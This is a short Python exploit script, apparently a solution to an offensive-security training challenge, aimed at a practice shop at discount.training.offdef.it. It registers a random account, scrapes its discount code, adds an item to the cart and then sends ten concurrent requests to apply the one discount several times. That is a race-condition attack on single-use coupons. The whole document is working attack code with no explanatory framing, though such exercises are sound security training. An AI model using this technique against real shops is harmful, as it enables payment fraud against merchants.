from threading import Thread
import time
import requests
import string
import random


URL = "http://discount.training.offdef.it/"

def register(username, password):
	url = URL + "/register"
	payload = {'username' : username, 'password' : password}
	r = requests.post(url, data=payload)
	return r.text[r.text.find("Code: ")+6:r.text.find("Code: ")+6+10]

def login(username, password):
	url = URL + "/login"
	payload = {'username' : username, 'password' : password}
	return requests.post(url, data=payload).cookies["session"]

def addCart(session):
	url = URL + "/add_to_cart?item_id=21"
	cookies = { 'session': session }
	return requests.get(url, cookies=cookies)

def applyDiscount(session, discount):
	url = URL + "/apply_discount"
	payload = {'discount': discount }
	cookies = { 'session': session }
	return requests.post(url, data=payload, cookies=cookies)

def pay(session):
	url = URL + "/cart/pay"
	cookies = { 'session': session }
	r = requests.get(url, cookies=cookies)
	return r.text

def items(session):
	url = URL + "/items"
	cookies = { 'session': session }
	r = requests.get(url, cookies=cookies)
	return r.text

def randomString(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

def cart(s):
	cookies = {"session": s}
	return requests.get(URL+"/cart", cookies=cookies)


username = randomString(10)
password = randomString(10)
discount = register(username, password)
session = login(username, password)
addCart(session)
discountRoutine = []

for i in range(0, 10):
	discountRoutine.append(Thread(target=applyDiscount, args=[session, discount]))

for i in range(0, 10):
	discountRoutine[i].start()

for i in range(0, 10):
	discountRoutine[i].join()

print(cart(session).text)
